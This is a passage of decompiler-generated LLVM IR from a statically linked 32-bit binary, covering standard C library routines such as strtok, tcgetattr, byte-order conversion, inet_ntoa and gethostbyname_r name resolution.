dec_label_pc_804f95d:                             ; preds = %dec_label_pc_804f95d.lr.ph, %dec_label_pc_804f97d
  %v4_804f95d = phi i32 [ %v4_804f95d.pre, %dec_label_pc_804f95d.lr.ph ], [ %v4_804f95d46, %dec_label_pc_804f97d ]
  %v6_804f95330 = phi i32 [ %v6_804f9532241, %dec_label_pc_804f95d.lr.ph ], [ %v6_804f953, %dec_label_pc_804f97d ]
  %v2_804f95329 = phi i8 [ %v2_804f9531940, %dec_label_pc_804f95d.lr.ph ], [ %v2_804f953, %dec_label_pc_804f97d ]
  %v1_804f95328 = phi i8* [ %v1_804f95318, %dec_label_pc_804f95d.lr.ph ], [ %v1_804f953, %dec_label_pc_804f97d ]
  %v0_804f97d27 = phi i32 [ %arg2, %dec_label_pc_804f95d.lr.ph ], [ %v1_804f97d, %dec_label_pc_804f97d ]
  %v0_804f97e26 = phi i32 [ %v0_804f98839, %dec_label_pc_804f95d.lr.ph ], [ %v1_804f97e, %dec_label_pc_804f97d ]
  %v1_804f95d = inttoptr i32 %v0_804f97e26 to i8*
  %v2_804f95d = load i8, i8* %v1_804f95d, align 1
  %v3_804f95d = zext i8 %v2_804f95d to i32
  %v5_804f95d = and i32 %v4_804f95d, -256
  %v6_804f95d = or i32 %v5_804f95d, %v3_804f95d
  %v15_804f95f = icmp eq i8 %v2_804f95329, %v2_804f95d
  br i1 %v15_804f95f, label %dec_label_pc_804f97d, label %dec_label_pc_804f967

dec_label_pc_804f967:                             ; preds = %dec_label_pc_804f95d
  %v0_804f967 = load i32, i32* bitcast (i32** @global_var_8058480.168 to i32*), align 128
  %v2_804f96d = load i8, i8* %v1_804f95d, align 1
  %v3_804f96d = zext i8 %v2_804f96d to i32
  %v2_804f970 = load i8, i8* %v1_804f95328, align 1
  %v3_804f970 = zext i8 %v2_804f970 to i32
  %v2_804f973 = mul nuw nsw i32 %v3_804f96d, 2
  %v3_804f973 = add i32 %v2_804f973, %v0_804f967
  %v4_804f973 = inttoptr i32 %v3_804f973 to i16*
  %v5_804f973 = load i16, i16* %v4_804f973, align 2
  %v6_804f973 = zext i16 %v5_804f973 to i32
  %v4_804f977 = mul nuw nsw i32 %v3_804f970, 2
  %v5_804f977 = add i32 %v4_804f977, %v0_804f967
  %v6_804f977 = inttoptr i32 %v5_804f977 to i16*
  %v7_804f977 = load i16, i16* %v6_804f977, align 2
  %v18_804f977 = icmp eq i16 %v5_804f973, %v7_804f977
  %v1_804f97b = icmp eq i1 %v18_804f977, false
  br i1 %v1_804f97b, label %dec_label_pc_804f981, label %dec_label_pc_804f97d

dec_label_pc_804f97d:                             ; preds = %dec_label_pc_804f967, %dec_label_pc_804f95d
  %v4_804f95d46 = phi i32 [ %v0_804f967, %dec_label_pc_804f967 ], [ %v6_804f95d, %dec_label_pc_804f95d ]
  %v4_804f9536 = phi i32 [ %v6_804f973, %dec_label_pc_804f967 ], [ %v6_804f95330, %dec_label_pc_804f95d ]
  %v1_804f97d = add i32 %v0_804f97d27, 1
  %v1_804f97e = add i32 %v0_804f97e26, 1
  %v1_804f953 = inttoptr i32 %v1_804f97d to i8*
  %v2_804f953 = load i8, i8* %v1_804f953, align 1
  %v3_804f953 = zext i8 %v2_804f953 to i32
  %v5_804f953 = and i32 %v4_804f9536, -256
  %v6_804f953 = or i32 %v3_804f953, %v5_804f953
  %v4_804f955 = icmp eq i8 %v2_804f953, 0
  %v1_804f957 = icmp eq i1 %v4_804f955, false
  br i1 %v1_804f957, label %dec_label_pc_804f95d, label %dec_label_pc_804f98d

dec_label_pc_804f981:                             ; preds = %dec_label_pc_804f967
  %v4_804f981 = icmp eq i8 %v2_804f95d, 0
  br i1 %v4_804f981, label %dec_label_pc_804f98b, label %dec_label_pc_804f988

dec_label_pc_804f988:                             ; preds = %dec_label_pc_804f981
  %v1_804f988 = add i32 %v0_804f98839, 1
  %v2_804f95319 = load i8, i8* %v1_804f95318, align 1
  %v3_804f95320 = zext i8 %v2_804f95319 to i32
  %v5_804f95321 = and i32 %v6_804f973, 65280
  %v6_804f95322 = or i32 %v3_804f95320, %v5_804f95321
  %v4_804f95523 = icmp eq i8 %v2_804f95319, 0
  %v1_804f95725 = icmp eq i1 %v4_804f95523, false
  br i1 %v1_804f95725, label %dec_label_pc_804f95d.lr.ph, label %dec_label_pc_804f98d

dec_label_pc_804f98b:                             ; preds = %dec_label_pc_804f981
  br label %dec_label_pc_804f98d

dec_label_pc_804f98d:                             ; preds = %dec_label_pc_804f988, %entry, %dec_label_pc_804f97d, %dec_label_pc_804f98b
  %storemerge = phi i32 [ 0, %dec_label_pc_804f98b ], [ %v4_804f947, %entry ], [ %v1_804f988, %dec_label_pc_804f988 ], [ %v0_804f98839, %dec_label_pc_804f97d ]
  store i32 %v0_804f943, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_804f95319, { 1, 2, 0 }
  uselistorder i8 %v2_804f953, { 1, 2, 0 }
  uselistorder i8* %v1_804f953, { 1, 0 }
  uselistorder i32 %v0_804f967, { 1, 2, 3, 0 }
  uselistorder i8 %v2_804f95d, { 1, 0, 2 }
  uselistorder i32 %v0_804f97e26, { 1, 0 }
  uselistorder i8 %v2_804f9531932, { 0, 2, 1 }
  uselistorder i8* %v1_804f95318, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f98d, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804f95d, { 1, 0 }
  uselistorder label %dec_label_pc_804f95d.lr.ph, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804f9a4 = inttoptr i32 %arg1 to i8*
  %v4_804f9a4 = call i32 @strtok_r(i8* %v3_804f9a4, i32 %arg2, i32 ptrtoint (i32* @global_var_805e500.169 to i32))
  ret i32 %v4_804f9a4
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_804f9bc = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804f9c1 = icmp eq i32 %v3_804f9bc, 0
  %v1_804f9c3 = zext i1 %v1_804f9c1 to i32
  ret i32 %v1_804f9c3
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f9d0 = load i32, i32* @esi, align 4
  %v0_804f9d1 = load i32, i32* @ebx, align 4
  store i32 %v0_804f9d1, i32* %stack_var_-8, align 4
  %v2_804f9d5 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804f9d5, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804f9e7 = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_804f9d5)
  store i32 %v3_804f9e7, i32* %eax.global-to-local, align 4
  %v1_804f9ef = icmp eq i32 %v3_804f9e7, 0
  store i32 %v3_804f9e7, i32* @esi, align 4
  %v1_804f9f3 = icmp eq i1 %v1_804f9ef, false
  br i1 %v1_804f9f3, label %dec_label_pc_804fa38, label %dec_label_pc_804f9f5

dec_label_pc_804f9f5:                             ; preds = %entry
  %v3_804f9f5 = load i32, i32* %stack_var_-44, align 4
  %v1_804f9f9 = load i32, i32* @ebx, align 4
  %v2_804f9f9 = inttoptr i32 %v1_804f9f9 to i32*
  store i32 %v3_804f9f5, i32* %v2_804f9f9, align 4
  %v1_804f9ff = load i32, i32* @ebx, align 4
  %v2_804f9ff = add i32 %v1_804f9ff, 4
  %v3_804f9ff = inttoptr i32 %v2_804f9ff to i32*
  %v1_804fa06 = load i32, i32* @ebx, align 4
  %v2_804fa06 = add i32 %v1_804fa06, 8
  %v3_804fa06 = inttoptr i32 %v2_804fa06 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804fa0d = load i32, i32* @ebx, align 4
  %v2_804fa0d = add i32 %v1_804fa0d, 12
  %v3_804fa0d = inttoptr i32 %v2_804fa0d to i32*
  store i32 %tmp3, i32* %v3_804fa0d, align 4
  %v4_804fa10 = zext i8 %tmp to i32
  %v5_804fa10 = load i32, i32* %eax.global-to-local, align 4
  %v6_804fa10 = and i32 %v5_804fa10, -256
  %v7_804fa10 = or i32 %v6_804fa10, %v4_804fa10
  store i32 %v7_804fa10, i32* %eax.global-to-local, align 4
  %v2_804fa14 = load i32, i32* @ebx, align 4
  %v3_804fa14 = add i32 %v2_804fa14, 16
  %v4_804fa14 = inttoptr i32 %v3_804fa14 to i8*
  store i8 %tmp, i8* %v4_804fa14, align 1
  %v0_804fa17 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fa1a = ptrtoint i32* %stack_var_-27 to i32
  %v0_804fa1f = load i32, i32* @ebx, align 4
  %v1_804fa1f = add i32 %v0_804fa1f, 17
  store i32 %v1_804fa1f, i32* %eax.global-to-local, align 4
  %v4_804fa23 = call i32 @__GI_mempcpy(i32 %v1_804fa1f, i32 %v2_804fa1a, i32 19, i32 %v0_804fa17)
  store i32 %v4_804fa23, i32* %eax.global-to-local, align 4
  %v3_804fa30 = inttoptr i32 %v4_804fa23 to i8*
  %v4_804fa30 = call i32 @__GI_memset(i8* %v3_804fa30, i32 0, i32 13)
  store i32 %v4_804fa30, i32* %eax.global-to-local, align 4
  %v0_804fa3b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804fa38

dec_label_pc_804fa38:                             ; preds = %entry, %dec_label_pc_804f9f5
  %v0_804fa3b = phi i32 [ %v3_804f9e7, %entry ], [ %v0_804fa3b.pre, %dec_label_pc_804f9f5 ]
  store i32 %v0_804fa3b, i32* %eax.global-to-local, align 4
  %v2_804fa3d = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804fa3d, i32* @ebx, align 4
  store i32 %v0_804f9d0, i32* @esi, align 4
  ret i32 %v0_804fa3b

; uselistorder directives
  uselistorder i32 %v0_804fa3b, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fa38, { 1, 0 }
}

define i32 @htons(i16 %arg1) local_unnamed_addr {
entry:
  %v3_804fa45 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_804fa45 = zext i16 %v3_804fa45 to i32
  ret i32 %v4_804fa45
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_804fa51 = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_804fa51
}

define i32 @ntohs(i16 %arg1) local_unnamed_addr {
entry:
  %v3_804fa59 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_804fa59 = zext i16 %v3_804fa59 to i32
  ret i32 %v4_804fa59
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804fa65 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804fa65
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804fa68 = load i32, i32* @edi, align 4
  store i32 0, i32* @edi, align 4
  %v0_804fa6b = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v0_804fa6e = load i32, i32* @ebx, align 4
  store i32 %v0_804fa6e, i32* %stack_var_-12, align 4
  %v1_804fa77 = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_804fa77, 16777216
  %v1_804fa79 = sdiv i32 %sext, 16777216
  store i32 %v1_804fa79, i32* @ebx, align 4
  %v1_804fa7b = add i32 %arg2, 15
  store i32 %v1_804fa7b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804fa80

dec_label_pc_804fa80:                             ; preds = %entry, %dec_label_pc_804faa5
  %v0_804fa8717 = phi i32 [ %v1_804fa79, %entry ], [ %v2_804faa5, %dec_label_pc_804faa5 ]
  %v0_804fab116 = phi i32 [ %v1_804fa7b, %entry ], [ %v0_804faa9, %dec_label_pc_804faa5 ]
  %v1_804fa8b = urem i32 %v0_804fa8717, 256
  %v5_804fa93 = inttoptr i32 %v0_804fab116 to i8*
  %v6_804fa93 = call i32 @_uintmaxtostr(i8* %v5_804fa93, i32 %v1_804fa8b, i32 0, i32 -10, i32 0)
  %v0_804fa9b = load i32, i32* @esi, align 4
  %v1_804fa9b = icmp eq i32 %v0_804fa9b, 0
  %v1_804fa9d = add i32 %v6_804fa93, -1
  store i32 %v1_804fa9d, i32* %ecx.global-to-local, align 4
  br i1 %v1_804fa9b, label %dec_label_pc_804faa5, label %dec_label_pc_804faa2

dec_label_pc_804faa2:                             ; preds = %dec_label_pc_804fa80
  %v1_804faa2 = inttoptr i32 %v0_804fa9b to i8*
  store i8 46, i8* %v1_804faa2, align 1
  %v0_804faa9.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804faa5

dec_label_pc_804faa5:                             ; preds = %dec_label_pc_804fa80, %dec_label_pc_804faa2
  %v0_804faa9 = phi i32 [ %v1_804fa9d, %dec_label_pc_804fa80 ], [ %v0_804faa9.pre, %dec_label_pc_804faa2 ]
  %v0_804faa5 = load i32, i32* @ebx, align 4
  %v2_804faa5 = udiv i32 %v0_804faa5, 256
  store i32 %v2_804faa5, i32* @ebx, align 4
  %v0_804faa8 = load i32, i32* @edi, align 4
  %v1_804faa8 = add i32 %v0_804faa8, 1
  store i32 %v1_804faa8, i32* @edi, align 4
  store i32 %v0_804faa9, i32* @esi, align 4
  %v7_804faae = icmp sgt i32 %v1_804faa8, 3
  br i1 %v7_804faae, label %dec_label_pc_804fab0, label %dec_label_pc_804fa80

dec_label_pc_804fab0:                             ; preds = %dec_label_pc_804faa5
  %v2_804fab0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fab0, i32* @ebx, align 4
  %v1_804fab1 = add i32 %v0_804faa9, 1
  store i32 %v0_804fa6b, i32* @esi, align 4
  store i32 %v0_804fa68, i32* @edi, align 4
  ret i32 %v1_804fab1

; uselistorder directives
  uselistorder i32 %v0_804faa9, { 0, 2, 1 }
  uselistorder i32 %v1_804fa79, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804faa5, { 1, 0 }
  uselistorder label %dec_label_pc_804fa80, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_804fac3 = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_805e504.170 to i32))
  ret i32 %v2_804fac3
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_804facf = ptrtoint i32* %stack_var_-4 to i32
  %v2_804fad8 = inttoptr i32 %arg1 to i8*
  %v3_804fad8 = call i32 @inet_aton(i8* %v2_804fad8, i32 %v2_804facf)
  %v1_804fae3 = icmp eq i32 %v3_804fad8, 0
  br i1 %v1_804fae3, label %dec_label_pc_804faeb, label %dec_label_pc_804fae7

dec_label_pc_804fae7:                             ; preds = %entry
  %v3_804fae7 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804faeb

dec_label_pc_804faeb:                             ; preds = %entry, %dec_label_pc_804fae7
  %v0_804faeb = phi i32 [ -1, %entry ], [ %v3_804fae7, %dec_label_pc_804fae7 ]
  ret i32 %v0_804faeb

; uselistorder directives
  uselistorder label %dec_label_pc_804faeb, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804faf7 = call i32 @__GI___h_errno_location()
  %v0_804fafc = load i32, i32* @edx, align 4
  %v2_804faff = ptrtoint i32* %stack_var_-4 to i32
  %v9_804fb17 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_805e6ec.172, i32 ptrtoint (i32* @global_var_805e520.171 to i32), i32 460, i32 %v2_804faff, i32 %v0_804faf7, i32 %v0_804fafc, i32 %v0_804fafc)
  %v3_804fb1c = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_804fb1c
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_804fb24 = load i32, i32* @ebp, align 4
  %v0_804fb25 = load i32, i32* @edi, align 4
  %v0_804fb26 = load i32, i32* @esi, align 4
  %v0_804fb27 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_804fb37 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_804fb37, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_804fb42 = icmp eq i32 %arg1, 0
  br i1 %v4_804fb42, label %dec_label_pc_804fe4e, label %dec_label_pc_804fb4d

dec_label_pc_804fb4d:                             ; preds = %entry
  %v1_804fb4d = call i32 @__errno_location(i32 %v0_804fb27)
  store i32 %v1_804fb4d, i32* %eax.global-to-local, align 4
  %v1_804fb52 = inttoptr i32 %v1_804fb4d to i32*
  %v2_804fb52 = load i32, i32* %v1_804fb52, align 4
  store i32 %v2_804fb52, i32* @edi, align 4
  store i32 %v1_804fb4d, i32* @esi, align 4
  store i32 0, i32* %v1_804fb52, align 4
  %v0_804fb65 = load i32, i32* @ebx, align 4
  store i32 %v0_804fb65, i32* %stack_var_-108, align 4
  %v7_804fb71 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_804fb65, i32 %arg5, i32 %arg6, i32 %v1_804fb4d)
  store i32 %v7_804fb71, i32* %eax.global-to-local, align 4
  %v1_804fb79 = icmp eq i32 %v7_804fb71, 0
  br i1 %v1_804fb79, label %dec_label_pc_804fe4e, label %dec_label_pc_804fb81

dec_label_pc_804fb81:                             ; preds = %dec_label_pc_804fb4d
  %v1_804fb85 = inttoptr i32 %arg6 to i32*
  %v2_804fb85 = load i32, i32* %v1_804fb85, align 4
  store i32 %v2_804fb85, i32* %edx.global-to-local, align 4
  %v9_804fb87 = icmp eq i32 %v2_804fb85, 1
  br i1 %v9_804fb87, label %dec_label_pc_804fba1, label %dec_label_pc_804fb8c

dec_label_pc_804fb8c:                             ; preds = %dec_label_pc_804fb81
  %v9_804fb8c = icmp eq i32 %v2_804fb85, 4
  br i1 %v9_804fb8c, label %dec_label_pc_804fba1, label %dec_label_pc_804fb91

dec_label_pc_804fb91:                             ; preds = %dec_label_pc_804fb8c
  %v1_804fb91 = add i32 %v2_804fb85, 1
  %v8_804fb91 = icmp eq i32 %v1_804fb91, 0
  store i32 %v1_804fb91, i32* %edx.global-to-local, align 4
  %v1_804fb92 = icmp eq i1 %v8_804fb91, false
  br i1 %v1_804fb92, label %dec_label_pc_804fe4e, label %dec_label_pc_804fb98

dec_label_pc_804fb98:                             ; preds = %dec_label_pc_804fb91
  %v0_804fb98 = load i32, i32* @esi, align 4
  %v1_804fb98 = inttoptr i32 %v0_804fb98 to i32*
  %v2_804fb98 = load i32, i32* %v1_804fb98, align 4
  %v11_804fb98 = icmp eq i32 %v2_804fb98, 2
  %v1_804fb9b = icmp eq i1 %v11_804fb98, false
  br i1 %v1_804fb9b, label %dec_label_pc_804fe4e, label %dec_label_pc_804fba1

dec_label_pc_804fba1:                             ; preds = %dec_label_pc_804fb98, %dec_label_pc_804fb8c, %dec_label_pc_804fb81
  %v0_804fba1 = load i32, i32* @ebp, align 4
  %v1_804fba3 = sub i32 0, %v0_804fba1
  %v1_804fba5 = urem i32 %v1_804fba3, 4
  %v2_804fba5 = icmp eq i32 %v1_804fba5, 0
  store i32 %v1_804fba5, i32* %eax.global-to-local, align 4
  %v0_804fba8 = load i32, i32* @edi, align 4
  %v1_804fba8 = load i32, i32* @esi, align 4
  %v2_804fba8 = inttoptr i32 %v1_804fba8 to i32*
  store i32 %v0_804fba8, i32* %v2_804fba8, align 4
  %v0_804fbbc.pre = load i32, i32* @ebx, align 4
  br i1 %v2_804fba5, label %dec_label_pc_804fbb8, label %dec_label_pc_804fbac

dec_label_pc_804fbac:                             ; preds = %dec_label_pc_804fba1
  %v1_804fbac = load i32, i32* %eax.global-to-local, align 4
  %v2_804fbac = sub i32 %v0_804fbbc.pre, %v1_804fbac
  %v7_804fbac = icmp ult i32 %v0_804fbbc.pre, %v1_804fbac
  br i1 %v7_804fbac, label %dec_label_pc_804fe49, label %dec_label_pc_804fbb4

dec_label_pc_804fbb4:                             ; preds = %dec_label_pc_804fbac
  %v0_804fbb4 = load i32, i32* @ebp, align 4
  %v2_804fbb4 = add i32 %v0_804fbb4, %v1_804fbac
  store i32 %v2_804fbb4, i32* @ebp, align 4
  store i32 %v2_804fbac, i32* @ebx, align 4
  br label %dec_label_pc_804fbb8

dec_label_pc_804fbb8:                             ; preds = %dec_label_pc_804fba1, %dec_label_pc_804fbb4
  %v0_804fbbc = phi i32 [ %v2_804fbac, %dec_label_pc_804fbb4 ], [ %v0_804fbbc.pre, %dec_label_pc_804fba1 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_804fb85, align 4
  %tmp41 = icmp ult i32 %v0_804fbbc, 4
  br i1 %tmp41, label %dec_label_pc_804fe49, label %dec_label_pc_804fbcb

dec_label_pc_804fbcb:                             ; preds = %dec_label_pc_804fbb8
  %v0_804fbcb = load i32, i32* @ebx, align 4
  %v1_804fbcb = add i32 %v0_804fbcb, -4
  store i32 %v1_804fbcb, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_804fbcb, 8
  br i1 %tmp42, label %dec_label_pc_804fe49, label %dec_label_pc_804fbd7

dec_label_pc_804fbd7:                             ; preds = %dec_label_pc_804fbcb
  %v1_804fbd7 = add i32 %v0_804fbcb, -12
  store i32 %v1_804fbd7, i32* %eax.global-to-local, align 4
  %v0_804fbda = load i32, i32* @ebp, align 4
  %v1_804fbda = add i32 %v0_804fbda, 4
  store i32 %v1_804fbda, i32* %edx.global-to-local, align 4
  store i32 %v1_804fbda, i32* %stack_var_-92, align 4
  %v3_804fbe3 = inttoptr i32 %v1_804fbda to i32*
  store i32 %v0_804fbda, i32* %v3_804fbe3, align 4
  %v0_804fbe6 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fbe6 = add i32 %v0_804fbe6, 4
  %v2_804fbe6 = inttoptr i32 %v1_804fbe6 to i32*
  store i32 0, i32* %v2_804fbe6, align 4
  %tmp43 = icmp ult i32 %v1_804fbd7, 32
  br i1 %tmp43, label %dec_label_pc_804fe49, label %dec_label_pc_804fbf3

dec_label_pc_804fbf3:                             ; preds = %dec_label_pc_804fbd7
  %v0_804fbf3 = load i32, i32* @ebx, align 4
  %v1_804fbf3 = add i32 %v0_804fbf3, -44
  store i32 %v1_804fbf3, i32* @ebx, align 4
  %tmp44 = icmp ult i32 %v1_804fbf3, 256
  br i1 %tmp44, label %dec_label_pc_804fe49, label %dec_label_pc_804fc06

dec_label_pc_804fc06:                             ; preds = %dec_label_pc_804fbf3
  %v0_804fc06 = load i32, i32* @ebp, align 4
  %v1_804fc06 = add i32 %v0_804fc06, 12
  %v1_804fc0d = add i32 %v0_804fc06, 44
  store i32 %v1_804fc0d, i32* @edi, align 4
  store i32 %v1_804fc0d, i32* %stack_var_-108, align 4
  %v3_804fc1a = inttoptr i32 %v1_804fc0d to i8*
  %v4_804fc1a = call i32 @strncpy(i8* %v3_804fc1a, i32 %arg1, i32 %v1_804fbf3)
  %v0_804fc1f = load i32, i32* @edi, align 4
  %v1_804fc1f = load i32, i32* @ebp, align 4
  %v2_804fc1f = add i32 %v1_804fc1f, 12
  %v3_804fc1f = inttoptr i32 %v2_804fc1f to i32*
  store i32 %v0_804fc1f, i32* %v3_804fc1f, align 4
  %v1_804fc26 = add i32 %v0_804fc06, 16
  %v2_804fc26 = inttoptr i32 %v1_804fc26 to i32*
  store i32 0, i32* %v2_804fc26, align 4
  %v2_804fc2d = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804fc2d, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_804fc2f = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_804fc34 = inttoptr i32 %arg1 to i8*
  %v3_804fc34 = call i32 @inet_aton(i8* %v2_804fc34, i32 %v0_804fc2f)
  store i32 %v3_804fc34, i32* %eax.global-to-local, align 4
  %v1_804fc3c = icmp eq i32 %v3_804fc34, 0
  br i1 %v1_804fc3c, label %dec_label_pc_804fc78, label %dec_label_pc_804fc40

dec_label_pc_804fc40:                             ; preds = %dec_label_pc_804fc06
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_804fc44 = load i32, i32* @edi, align 4
  store i32 %v0_804fc44, i32* %arg2, align 4
  %v1_804fc46 = add i32 %tmp18, 8
  %v2_804fc46 = inttoptr i32 %v1_804fc46 to i32*
  store i32 2, i32* %v2_804fc46, align 4
  %v0_804fc4d = load i32, i32* %edx.global-to-local, align 4
  %v1_804fc4d = add i32 %v0_804fc4d, 12
  %v2_804fc4d = inttoptr i32 %v1_804fc4d to i32*
  store i32 4, i32* %v2_804fc4d, align 4
  %v2_804fc54 = load i32, i32* %stack_var_-92, align 4
  %v1_804fc57 = load i32, i32* %edx.global-to-local, align 4
  %v2_804fc57 = add i32 %v1_804fc57, 16
  %v3_804fc57 = inttoptr i32 %v2_804fc57 to i32*
  store i32 %v2_804fc54, i32* %v3_804fc57, align 4
  %v1_804fc5e = load i32, i32* %edx.global-to-local, align 4
  %v2_804fc5e = add i32 %v1_804fc5e, 4
  %v3_804fc5e = inttoptr i32 %v2_804fc5e to i32*
  store i32 %v1_804fc06, i32* %v3_804fc5e, align 4
  %v0_804fc65 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804fc65, i32* %v1_804fb37, align 4
  store i32 0, i32* %v1_804fb85, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fe4e

dec_label_pc_804fc78:                             ; preds = %dec_label_pc_804fc06
  %v0_804fc78 = call i32 @__open_nameservers()
  store i32 %v0_804fc78, i32* @eax, align 4
  %v2_804fc88 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804fc88, i32* @ebx, align 4
  store i32 %v2_804fc88, i32* %stack_var_-108, align 4
  %v2_804fc8d = call i32 @__pthread_return_void(i32 %v2_804fc88, i32 134552147)
  store i32 %v2_804fc8d, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8058488.173 to i32), i32* %stack_var_-108, align 4
  %v1_804fc99 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058488.173 to i32))
  %v0_804fc9e = load i32, i32* @global_var_805eb74.174, align 4
  store i32 %v0_804fc9e, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_8058488.173 to i32), i32* @ecx, align 4
  store i32 134552147, i32* @eax, align 4
  store i32 %v2_804fc88, i32* %stack_var_-108, align 4
  %v2_804fca9 = call i32 @__pthread_return_void(i32 %v2_804fc88, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_804fcc4 = ptrtoint i32* %stack_var_-76 to i32
  %v2_804fcc9 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804fcc9, i32* %eax.global-to-local, align 4
  store i32 %v2_804fcc9, i32* %stack_var_-108, align 4
  %v0_804fcd3 = load i32, i32* @esi, align 4
  %v7_804fcda = call i32 @__dns_lookup(i8* %v2_804fc34, i32 1, i32 %v0_804fcd3, i32 ptrtoint (i32* @global_var_805eb68.175 to i32), i32 %v2_804fcc9, i32 %v2_804fcc4)
  store i32 %v7_804fcda, i32* %eax.global-to-local, align 4
  %v2_804fce2 = icmp slt i32 %v7_804fcda, 0
  %v1_804fce4 = icmp eq i1 %v2_804fce2, false
  br i1 %v1_804fce4, label %dec_label_pc_804fcfa, label %dec_label_pc_804fce6

dec_label_pc_804fce6:                             ; preds = %dec_label_pc_804fc78
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_804fb85, align 4
  br label %dec_label_pc_804fe4e

dec_label_pc_804fcfa:                             ; preds = %dec_label_pc_804fc78
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_804fd0d = icmp ugt i32 %v1_804fbf3, 256
  %v15_804fd0d = icmp eq i32 %v0_804fbf3, 300
  %v2_804fd11 = or i1 %v10_804fd0d, %v15_804fd0d
  br i1 %v2_804fd11, label %dec_label_pc_804fdac, label %dec_label_pc_804fd13

dec_label_pc_804fd13:                             ; preds = %dec_label_pc_804fcfa
  %v3_804fd16 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804fd16, i32* %stack_var_-108, align 4
  %v1_804fd1a = call i32 @free(i32 %v3_804fd16)
